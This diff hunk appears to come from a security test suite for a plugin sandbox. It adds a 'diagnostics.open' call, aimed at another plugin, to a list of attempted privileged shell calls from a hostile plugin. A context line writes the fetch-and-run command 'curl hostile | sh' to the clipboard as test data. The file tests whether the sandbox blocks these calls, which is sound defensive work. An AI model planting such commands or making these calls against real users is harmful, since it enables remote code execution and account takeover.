@@ -179,6 +179,9 @@ async function backgroundAttacks(app, exfil) {
     raw("clipboard.write", ["curl hostile | sh"]),
   );
   r["shell.step-up"] = await attempt(() => raw("stepUp"));
+  r["shell.diagnostics-open"] = await attempt(() =>
+    raw("diagnostics.open", [{ pluginId: "hostile-victim" }]),
+  );
   r["shell.sign-out"] = await attempt(() => raw("session.signOut"));
   r["shell.passkey"] = await attempt(() => raw("passkey.run", ["x", {}]));
   r["shell.serial"] = await attempt(() =>
